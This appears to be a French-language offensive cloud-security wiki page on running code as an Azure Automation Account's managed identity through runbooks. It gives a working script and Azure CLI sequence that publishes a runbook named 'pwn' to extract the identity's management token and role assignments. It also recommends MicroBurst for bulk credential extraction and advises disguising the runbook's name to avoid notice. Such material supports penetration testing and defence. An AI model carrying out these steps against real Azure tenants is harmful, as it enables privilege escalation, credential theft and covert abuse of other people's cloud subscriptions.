---
title: "Runbooks : exécution de code en tant qu'identité du compte Automation"
order: 1
description: "Écrire et démarrer un runbook Automation qui s'exécute en tant qu'identité du compte pour une exécution de code arbitraire."
keywords:
  - runbook
  - Automation Account
  - code execution
  - managed identity
  - job
---

# Runbooks

Un runbook est un script que l'Automation Account exécute sous son **identité managée affectée par le système** (ou l'ancien RunAs). Avec un accès en écriture au compte, publiez un runbook qui forge le jeton de l'identité ou exécute des commandes arbitraires, démarrez-le, puis lisez la sortie du job. C'est la primitive la plus propre d'Azure pour obtenir du code arbitraire en tant qu'identité privilégiée.

## Écrire et démarrer un runbook

```bash
cat > r.ps1 <<'EOF'
Connect-AzAccount -Identity | Out-Null
(Get-AzAccessToken -ResourceUrl "https://management.azure.com/").Token
Get-AzRoleAssignment | Out-String
EOF
az automation runbook create -g <rg> --automation-account-name <aa> -n pwn --type PowerShell
az automation runbook replace-content -g <rg> --automation-account-name <aa> -n pwn --content @r.ps1
az automation runbook publish -g <rg> --automation-account-name <aa> -n pwn
az automation runbook start -g <rg> --automation-account-name <aa> -n pwn
# then read the job output for the token
```

## Notes d'exploitation

- Le jeton est celui de l'identité managée de l'Automation Account ; ses attributions de rôle sont souvent Contributor ou plus sur l'ensemble de l'abonnement.
- `Get-AzPasswords` (MicroBurst) automatise la publication d'un runbook de collecte et l'extraction des jetons et assets en clair du compte en une seule étape.
- Les jobs et leur sortie sont journalisés dans le compte ; un runbook nommé comme un runbook légitime passe inaperçu.

## Outils

- **Azure CLI** (`az automation runbook`), **Az PowerShell** (`Connect-AzAccount -Identity`).
- **MicroBurst** (`Get-AzPasswords`) : extraction d'identifiants automatisée basée sur les runbooks.

## Références

- [HackTricks Cloud: Azure Automation runbooks](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst Get-AzPasswords](https://github.com/NetSPI/MicroBurst)
- [Microsoft: managed identities for Azure Automation](https://learn.microsoft.com/azure/automation/enable-managed-identity-for-automation)
